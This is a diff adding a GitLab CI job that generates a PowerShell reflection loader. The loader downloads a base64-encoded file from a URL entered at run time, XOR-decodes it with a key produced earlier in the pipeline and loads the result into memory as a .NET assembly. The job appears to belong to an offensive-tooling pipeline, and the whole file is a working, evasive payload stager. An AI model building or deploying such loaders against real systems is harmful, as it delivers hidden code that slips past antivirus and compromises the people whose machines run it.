@@ -1,0 +1,27 @@
+variables:
+  DOTNETXOR_REFLECTION_LOADER_PATH: $CI_DOTNETXOR_OUTPUT_NAME-reflection-loader.ps1
+create_xorkey_loader:
+  only:
+    variables:
+     - $CI_LOADERS =~ /^.*(b64XorRefelection).*$/
+  stage: load
+  image: gcr.io/$GCP_PROJECT_ID/linuxutils:latest
+  tags: 
+   - kubernetes
+   - linux
+  script:
+    - mkdir -p deploy_dir
+    - XOR_KEY_VALUE_HEX=$(cat deploy_dir/$EXE_FILE_NAME-xor.key)
+    - echo $XOR_KEY_VALUE_HEX
+    - echo '$webClient = New-Object System.Net.WebClient' >> $DOTNETXOR_REFLECTION_LOADER_PATH
+    - echo '$urlToB64File -eq $null -and ($urlToB64File = Read-Host "urlToB64File")' >> $DOTNETXOR_REFLECTION_LOADER_PATH
+    - echo '$filebytes = [Convert]::FromBase64String($webClient.DownloadString($urlToB64File))' >> $DOTNETXOR_REFLECTION_LOADER_PATH
+    - echo 'for($i=0; $i -lt $filebytes.count ; $i++) {$filebytes[$i] = $filebytes[$i] -bxor' $XOR_KEY_VALUE_HEX'}' >> $DOTNETXOR_REFLECTION_LOADER_PATH
+    - echo '$asm = [System.Reflection.Assembly]::Load($filebytes)' >> $DOTNETXOR_REFLECTION_LOADER_PATH
+    - cat $DOTNETXOR_REFLECTION_LOADER_PATH
+    - cp $DOTNETXOR_REFLECTION_LOADER_PATH deploy_dir/$DOTNETXOR_REFLECTION_LOADER_PATH
+  artifacts:
+    paths: 
+      - $DOTNETXOR_REFLECTION_LOADER_PATH
+      - deploy_dir
+    expire_in: 1 week
